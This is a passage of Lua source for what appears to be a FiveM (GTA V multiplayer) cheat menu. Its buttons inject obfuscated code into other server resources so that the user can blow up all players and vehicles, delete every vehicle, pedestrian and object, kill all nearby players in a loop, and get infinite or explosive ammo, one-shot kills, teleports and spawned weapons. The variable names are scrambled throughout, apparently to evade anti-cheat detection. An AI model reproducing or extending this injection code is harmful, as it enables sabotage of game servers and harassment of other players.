                if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                    local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                    hGjFkDlSaPwOeIr(
                        tYuIoPaSdFgHjKl(),
                        nMzXcVbNmQwErTy.x,
                        nMzXcVbNmQwErTy.y,
                        nMzXcVbNmQwErTy.z,
                        6,     -- Explosion type
                        1.0,   -- Damage scale
                        true,  -- Audible
                        false, -- Invisible
                        0.0    -- Camera shake
                    )
                end
            end
        end

        fGhJkLpOiUzXcVb()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Explode All Vehicles", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function uYhGtFrEdWsQaZx()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = GetEntityCoords
            local vBnMkLoPiUyTrEw = AddOwnedExplosion
            local nMzXcVbNmQwErTy = PlayerPedId

            local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
            local me = nMzXcVbNmQwErTy()
            for _, veh in ipairs(_vehicles) do
                if xAsDfGhJkLpOiUz(veh) then
                    local pos = cVbNmQwErTyUiOp(veh)
                    vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                end
            end
        end
        uYhGtFrEdWsQaZx()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Delete All Vehicles", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function zXcVbNmQwErTyUi()
            local aSdFgHjKlQwErTy = GetGamePool
            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
            local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
            local tYuIoPaSdFgHjKl = DeleteEntity
            local yUiOpAsDfGhJkLz = PlayerPedId
            local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
            local gJkLoPiUyTrEqWe = GetGameTimer
            local fDeSwQaZxCvBnMm = Wait

            local me = yUiOpAsDfGhJkLz()
            local myVeh = uIoPaSdFgHjKlQw(me, false)

            local vehicles = aSdFgHjKlQwErTy("CVehicle")
            for _, veh in ipairs(vehicles) do
                if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                    mNbVcCxZzLlKkJj(veh)
                    local timeout = gJkLoPiUyTrEqWe() + 500
                    while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                        fDeSwQaZxCvBnMm(0)
                    end
                    if hGjFkDlSaPwOeIr(veh) then
                        tYuIoPaSdFgHjKl(veh)
                    end
                end
            end
        end
        zXcVbNmQwErTyUi()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Delete All Peds", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qWeRtYuIoPlMnBv()
            local zXcVbNmQwErTyUi = GetGamePool
            local aSdFgHjKlQwErTy = DoesEntityExist
            local pOiUyTrEeRwQtYy = DeleteEntity
            local mNbVcCxZzLlKkJj = PlayerId
            local hGjFkDlSaPwOeIr = GetPlayerPed
            local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
            local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
            local uIoPaSdFgHjKlQw = GetGameTimer
            local gJkLoPiUyTrEqWe = Wait
            local vBnMkLoPiUyTrEw = IsPedAPlayer

            local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
            local peds = zXcVbNmQwErTyUi("CPed")

            for _, ped in ipairs(peds) do
                if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                    tYuIoPaSdFgHjKl(ped)
                    local timeout = uIoPaSdFgHjKlQw() + 500
                    while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                        gJkLoPiUyTrEqWe(0)
                    end
                    if yUiOpAsDfGhJkLz(ped) then
                        pOiUyTrEeRwQtYy(ped)
                    end
                end
            end
        end
        qWeRtYuIoPlMnBv()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Delete All Objects", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function mNqAzXwSeRdTfGy()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = DeleteEntity
            local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
            local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
            local yUiOpAsDfGhJkLz = GetGameTimer
            local uIoPaSdFgHjKlQw = Wait

            local objects = rTyUiOpAsDfGhJk("CObject")
            for _, obj in ipairs(objects) do
                if xAsDfGhJkLpOiUz(obj) then
                    vBnMkLoPiUyTrEw(obj)
                    local timeout = yUiOpAsDfGhJkLz() + 500
                    while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                        uIoPaSdFgHjKlQw(0)
                    end
                    if nMzXcVbNmQwErTy(obj) then
                        cVbNmQwErTyUiOp(obj)
                    end
                end
            end
        end
        mNqAzXwSeRdTfGy()
    ]])
end)

MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
        aSwDeFgHiJkLoPx = true

        local function pLoMkIjUhbGyTf()
            local mAxPlErOy = PlayerPedId()
            local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
            local gBvTnCuXe = 100
            local aSdFgHjKl = 1000.0
            local lKjHgFdSa = 300.0

            local nBxMzLqPw = CreateThread
            local qWeRtYuiOp = ShootSingleBulletBetweenCoords

            nBxMzLqPw(function()
                while aSwDeFgHiJkLoPx and not Unloaded do
                    Wait(gBvTnCuXe)
                    local bNmZxSwEd = GetActivePlayers()
                    local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                    for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                        local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                        if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                            local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                            if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                local xScVbNmAz = vector3(
                                    eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.z + 1.2
                                )

                                local dFgHjKlZx = vector3(
                                    eDxCfVgBh.x,
                                    eDxCfVgBh.y,
                                    eDxCfVgBh.z + 0.2
                                )

                                qWeRtYuiOp(
                                    xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                    dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                    aSdFgHjKl,
                                    true,
                                    rVtNiUcEx,
                                    mAxPlErOy,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        pLoMkIjUhbGyTf()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        aSwDeFgHiJkLoPx = false
    ]])
end)

MachoMenuCheckbox(ServerTabSections[2], "Permanent Kill Everyone", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
        qWeRtYuIoPlMnAb = true

        local function bZxLmNcVqPeTyUi()
            local vBnMkLoPi = PlayerPedId()
            local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
            local eDxCfVgBh = 100
            local lKjHgFdSa = 1000.0
            local mAxPlErOy = 300.0

            local rTwEcVzUi = CreateThread
            local oPiLyKuJm = ShootSingleBulletBetweenCoords

            rTwEcVzUi(function()
                while qWeRtYuIoPlMnAb and not Unloaded do
                    Wait(eDxCfVgBh)
                    local aSdFgHjKl = GetActivePlayers()
                    local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                    for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                        local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                        if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                            local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                            if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                local jUiKoLpMq = vector3(
                                    zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.z + 1.2
                                )

                                local cReAtEtHrEaD = vector3(
                                    zAsXcVbNm.x,
                                    zAsXcVbNm.y,
                                    zAsXcVbNm.z + 0.2
                                )

                                oPiLyKuJm(
                                    jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                    cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                    lKjHgFdSa,
                                    true,
                                    wQaSzXedC,
                                    vBnMkLoPi,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        bZxLmNcVqPeTyUi()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        qWeRtYuIoPlMnAb = false
    ]])
end)

-- Teleport Tab
local CoordsHandle = MachoMenuInputbox(TeleportTabSections[1], "Coords:", "x, y, z")
MachoMenuButton(TeleportTabSections[1], "Teleport to Coords", function()
    local zXcVbNmQwErTyUi = MachoMenuGetInputbox(CoordsHandle)

    if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= "" then
        local aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv = zXcVbNmQwErTyUi:match("([^,]+),%s*([^,]+),%s*([^,]+)")
        aSdFgHjKlQwErTy = tonumber(aSdFgHjKlQwErTy)
        qWeRtYuIoPlMnBv = tonumber(qWeRtYuIoPlMnBv)
        zLxKjHgFdSaPlMnBv = tonumber(zLxKjHgFdSaPlMnBv)

        if aSdFgHjKlQwErTy and qWeRtYuIoPlMnBv and zLxKjHgFdSaPlMnBv then
            MachoInjectResource(CheckResource("monitor") and "monitor" or "any", string.format([[
                local function b0NtdqLZKW()
                    local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                    local nHgFdSaZxCvBnMq = PlayerPedId
                    local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                    local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                    local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                    local x, y, z = %f, %f, %f
                    local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                    if found then z = gZ + 1.0 end

                    local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                    uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                end

                b0NtdqLZKW()
            ]], aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv))
        end
    end
end)

MachoMenuButton(TeleportTabSections[1], "Waypoint", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function xQX7uzMNfb()
            local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
            local zXcVbNmQwErTyUi = DoesBlipExist
            local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
            local lKjHgFdSaPlMnBv = PlayerPedId
            local qWeRtYuIoPlMnBv = SetEntityCoords

            local function XcVrTyUiOpAsDfGh()
                local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
            end

            local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
            if GhTyUoLpZmNbVcXq then
                local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
            end
        end

        xQX7uzMNfb()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "FIB Building", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function HAZ6YqLRbM()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 140.43, -750.52, 258.15
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        HAZ6YqLRbM()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Mission Row PD", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function oypB9FcNwK()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 425.1, -979.5, 30.7
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        oypB9FcNwK()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Pillbox Hospital", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function TmXU0zLa4e()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 308.6, -595.3, 43.28
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        TmXU0zLa4e()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Del Perro Pier", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function eLQN9XKwbJ()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -1632.87, -1007.81, 13.07
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        eLQN9XKwbJ()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Grove Street", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function YrAFvPMkqt()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 109.63, -1943.14, 20.80
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        YrAFvPMkqt()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Legion Square", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function zdVCXL8rjp()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 229.21, -871.61, 30.49
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        zdVCXL8rjp()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "LS Customs", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function oKXpQUYwd5()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -365.4, -131.8, 37.7
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        oKXpQUYwd5()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Maze Bank", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function E1tYUMowqF()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -75.24, -818.95, 326.1
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        E1tYUMowqF()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Mirror Park", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function Ptn2qMBvYe()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 1039.2, -765.3, 57.9
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        Ptn2qMBvYe()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Vespucci Beach", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function gQZf7xYULe()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -1223.8, -1516.6, 4.4
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        gQZf7xYULe()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Vinewood", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function JqXLKbvR20()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 293.2, 180.5, 104.3
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        JqXLKbvR20()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Sandy Shores", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function NxvTpL3qWz()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 1843.10, 3707.60, 33.52
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        NxvTpL3qWz()
    ]])
end)

MachoMenuButton(TeleportTabSections[2], "Print Current Coords", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function Xy9TqLzVmN()
            local zXcVbNmQwErTyUi = GetEntityCoords
            local aSdFgHjKlQwErTy = PlayerPedId

            local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
            local x, y, z = coords.x, coords.y, coords.z
            print(string.format("[^3FODO^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
        end

        Xy9TqLzVmN()
    ]])
end)

-- Weapon Tab
MachoMenuCheckbox(WeaponTabSections[1], "Infinite Ammo", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
        LkJgFdSaQwErTy = true

        local function qUwKZopRM8()
            if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
            LkJgFdSaQwErTy = true

            local MnBvCxZlKjHgFd = CreateThread
            MnBvCxZlKjHgFd(function()
                local AsDfGhJkLzXcVb = PlayerPedId
                local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                local GhJkLzXcVbNmQw = SetPedAmmo

                while LkJgFdSaQwErTy and not Unloaded do
                    local ped = AsDfGhJkLzXcVb()
                    local weapon = ZxCvBnMqWeRtYu(ped)

                    QwErTyUiOpAsDf(ped, true)

                    if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                        GhJkLzXcVbNmQw(ped, weapon, 250)
                    end

                    Wait(0)
                end
            end)
        end

        qUwKZopRM8()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        LkJgFdSaQwErTy = false

        local function yFBN9pqXcL()
            local AsDfGhJkLzXcVb = PlayerPedId
            local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
            QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
        end

        yFBN9pqXcL()
    ]])
end)

MachoMenuCheckbox(WeaponTabSections[1], "Explosive Ammo", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
        QzWxEdCvTrBnYu = true

        local function WpjLRqtm28()
            if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
            QzWxEdCvTrBnYu = true

            local UyJhNbGtFrVbCx = CreateThread
            UyJhNbGtFrVbCx(function()
                local HnBvFrTgYhUzKl = PlayerPedId
                local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                local JkLpHgTfCvXzQa = AddOwnedExplosion

                while QzWxEdCvTrBnYu and not Unloaded do
                    local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                    local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                    if XsWaQzEdCvTrBn then
                        JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                    end

                    Wait(0)
                end
            end)
        end

        WpjLRqtm28()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        QzWxEdCvTrBnYu = false
    ]])
end)

MachoMenuCheckbox(WeaponTabSections[1], "Oneshot Kill", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
        RfGtHyUjMiKoLp = true

        local function xUQp7AK0tv()
            local PlMnBvCxZaSdFg = CreateThread
            PlMnBvCxZaSdFg(function()
                local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                local ErTyUiOpAsDfGh = PlayerPedId

                while RfGtHyUjMiKoLp do
                    if Unloaded then
                        RfGtHyUjMiKoLp = false
                        break
                    end

                    local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                    if Wp and Wp ~= 0 then
                        AsDfGhJkLzXcVb(Wp, 1000.0)
                    end

                    Wait(0)
                end
            end)
        end

        xUQp7AK0tv()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        RfGtHyUjMiKoLp = false
        local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
        local AsDfGhJkLzXcVb = SetWeaponDamageModifier
        local ErTyUiOpAsDfGh = PlayerPedId
        local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
        if Wp and Wp ~= 0 then
            AsDfGhJkLzXcVb(Wp, 1.0)
        end
    ]])
end)

local WeaponHandle = MachoMenuInputbox(WeaponTabSections[2], "Weapon:", "...")

MachoMenuButton(WeaponTabSections[2], "Spawn Weapon", function()
    local weaponName = MachoMenuGetInputbox(WeaponSpawnerBox)

    if weaponName and weaponName ~= "" then
        MachoInjectResource((CheckResource("monitor") and "monitor") or "any", string.format([[
            local function GiveWeapon()
                local ped = PlayerPedId()
                local weapon = GetHashKey("%s")
                local XeCwVrBtNuMyLk = GiveWeaponToPed
                XeCwVrBtNuMyLk(ped, weapon, 250, true, true)
            end

            GiveWeapon()
        ]], weaponName))
    end
end)

-- local WeaponHandle = MachoMenuInputbox(WeaponTabSections[2], "Weapon:", "...")

-- MachoMenuButton(WeaponTabSections[2], "Spawn Weapon", function()
--     local gNpLmKjHyUjIqEr = MachoMenuGetInputbox(WeaponSpawnerBox)

--     if gNpLmKjHyUjIqEr and gNpLmKjHyUjIqEr ~= "" then
--         MachoInjectResource(CheckResource("monitor") and "monitor" or "any", string.format([[        
--             local function ntQ3LbwJxZ()
--                 local LpKoMnJbHuGyTf = CreateThread
--                 LpKoMnJbHuGyTf(function()
--                     local SxWaQzEdCvTrBn = GetHashKey
--                     local TyGuJhNbVfCrDx = RequestWeaponAsset
--                     local UiJmNbGtFrVbCx = HasWeaponAssetLoaded
--                     local XeCwVrBtNuMyLk = GiveWeaponToPed
--                     local IuJhNbVgTfCvXz = PlayerPedId

--                     local DfGhJkLpPoNmZx = SxWaQzEdCvTrBn("%s")
--                     TyGuJhNbVfCrDx(DfGhJkLpPoNmZx, 31, 0)

--                     while not UiJmNbGtFrVbCx(DfGhJkLpPoNmZx) do
--                         Wait(0)
--                     end

--                     XeCwVrBtNuMyLk(IuJhNbVgTfCvXz(), DfGhJkLpPoNmZx, 250, true, true)
--                 end)
--             end

--             ntQ3LbwJxZ()
--         ]], gNpLmKjHyUjIqEr))
--     end
-- end)

local AnimationDropDownChoice = 0

local AnimationMap = {
    [0] = { name = "Default", hash = "MP_F_Freemode" },
    [1] = { name = "Gangster", hash = "Gang1H" },
    [2] = { name = "Wild", hash = "GangFemale" },
    [3] = { name = "Red Neck", hash = "Hillbilly" }
}

MachoMenuDropDown(WeaponTabSections[3], "Aiming Style", function(index)
    AnimationDropDownChoice = index
end,
    "Default",
    "Gangster",
    "Wild",
    "Red Neck"
)

MachoMenuButton(WeaponTabSections[3], "Apply Aiming Style", function()
    local Animation = AnimationMap[AnimationDropDownChoice]
    if not Animation then return end

    MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
        local function vXK2dPLR07()
            local UiOpAsDfGhJkLz = PlayerPedId
            local PlMnBvCxZaSdFg = GetHashKey
            local QwErTyUiOpAsDf = SetWeaponAnimationOverride

            local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
            QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
        end

        vXK2dPLR07()

    ]]):format(Animation.hash))
end)

-- Vehicle Tab
